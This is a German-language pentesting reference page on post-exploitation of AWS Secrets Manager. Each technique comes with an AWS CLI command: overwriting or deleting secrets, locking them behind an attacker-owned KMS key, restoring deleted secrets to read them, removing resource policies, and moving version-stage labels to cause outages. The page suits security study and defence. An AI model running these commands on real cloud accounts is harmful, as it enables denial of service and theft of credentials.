# AWS - Secrets Manager Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Secrets Manager

Für weitere Informationen siehe:

{{#ref}}
../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Secrets lesen

Die **Secrets selbst sind sensible Informationen**, [siehe die privesc-Seite](../aws-privilege-escalation/aws-secrets-manager-privesc.md), um zu lernen, wie man sie liest.

### DoS: Secret-Wert ändern

Durch das Ändern des Secret-Werts könntest du **ein DoS für alle Systeme verursachen, die von diesem Wert abhängen.**

> [!WARNING]
> Beachte, dass frühere Werte ebenfalls gespeichert werden, sodass man einfach zum vorherigen Wert zurückkehren kann.
```bash
# Requires permission secretsmanager:PutSecretValue
aws secretsmanager put-secret-value \
--secret-id MyTestSecret \
--secret-string "{\"user\":\"diegor\",\"password\":\"EXAMPLE-PASSWORD\"}"
```
### DoS Change KMS key

Wenn der Angreifer die Berechtigung secretsmanager:UpdateSecret besitzt, kann er das secret so konfigurieren, dass es einen vom Angreifer kontrollierten KMS key verwendet. Dieser KMS key wird anfänglich so eingerichtet, dass jeder darauf zugreifen und ihn verwenden kann, sodass das Aktualisieren des secret mit dem neuen KMS key möglich ist. Wäre der KMS key nicht zugänglich gewesen, hätte das secret nicht aktualisiert werden können.

Nachdem der Angreifer den KMS key für das secret geändert hat, passt er die Konfiguration seines KMS keys so an, dass nur noch er darauf zugreifen kann. Auf diese Weise werden spätere Versionen des secret mit dem neuen KMS key verschlüsselt, und da kein Zugriff auf den Key besteht, geht die Möglichkeit verloren, das secret abzurufen.

Wichtig zu beachten ist, dass diese Unzugänglichkeit erst bei späteren Versionen auftritt, nachdem sich der Inhalt des secret geändert hat, da die aktuelle Version noch mit dem ursprünglichen KMS key verschlüsselt ist.
```bash
aws secretsmanager update-secret \
--secret-id MyTestSecret \
--kms-key-id arn:aws:kms:us-west-2:123456789012:key/EXAMPLE1-90ab-cdef-fedc-ba987EXAMPLE
```
### DoS Deleting Secret

Die minimale Anzahl an Tagen, um ein secret zu löschen, beträgt 7
```bash
aws secretsmanager delete-secret \
--secret-id MyTestSecret \
--recovery-window-in-days 7
```
## secretsmanager:RestoreSecret

Es ist möglich, ein Secret wiederherzustellen, wodurch Secrets, die zur Löschung vorgesehen wurden, wiederhergestellt werden können, da die minimale Löschfrist für Secrets 7 Tage und die maximale 30 Tage beträgt. In Kombination mit der Berechtigung secretsmanager:GetSecretValue ermöglicht dies, deren Inhalte abzurufen.

Um ein Secret wiederherzustellen, das sich im Löschvorgang befindet, können Sie den folgenden Befehl verwenden:
```bash
aws secretsmanager restore-secret \
--secret-id <Secret_Name>
```
## secretsmanager:DeleteResourcePolicy

Diese Aktion erlaubt das Löschen der Resource Policy, die steuert, wer auf ein Secret zugreifen kann. Dies könnte zu einem DoS führen, wenn die Resource Policy so konfiguriert war, dass sie einem bestimmten Benutzerkreis Zugriff erlaubt.

Um die Resource Policy zu löschen:
```bash
aws secretsmanager delete-resource-policy \
--secret-id <Secret_Name>
```
## secretsmanager:UpdateSecretVersionStage

Die States eines Secrets werden verwendet, um Versionen eines Secrets zu verwalten. AWSCURRENT kennzeichnet die aktive Version, die Anwendungen verwenden; AWSPREVIOUS behält die vorherige Version, damit Sie bei Bedarf zurückrollen können; und AWSPENDING wird im Rotationsprozess genutzt, um eine neue Version vorzubereiten und zu validieren, bevor sie zur aktuellen gemacht wird.

Anwendungen lesen immer die Version mit AWSCURRENT. Wenn jemand dieses Label auf die falsche Version verschiebt, verwenden die Apps ungültige Anmeldeinformationen und können fehlschlagen.

AWSPREVIOUS wird nicht automatisch verwendet. Wenn jedoch AWSCURRENT entfernt oder falsch neu zugewiesen wird, kann es so aussehen, als würde weiterhin alles mit der vorherigen Version laufen.
```bash
aws secretsmanager update-secret-version-stage \
--secret-id <your-secret-name-or-arn> \
--version-stage AWSCURRENT \
--move-to-version-id <target-version-id> \
--remove-from-version-id <previous-version-id>
```
{{#include ../../../banners/hacktricks-training.md}}
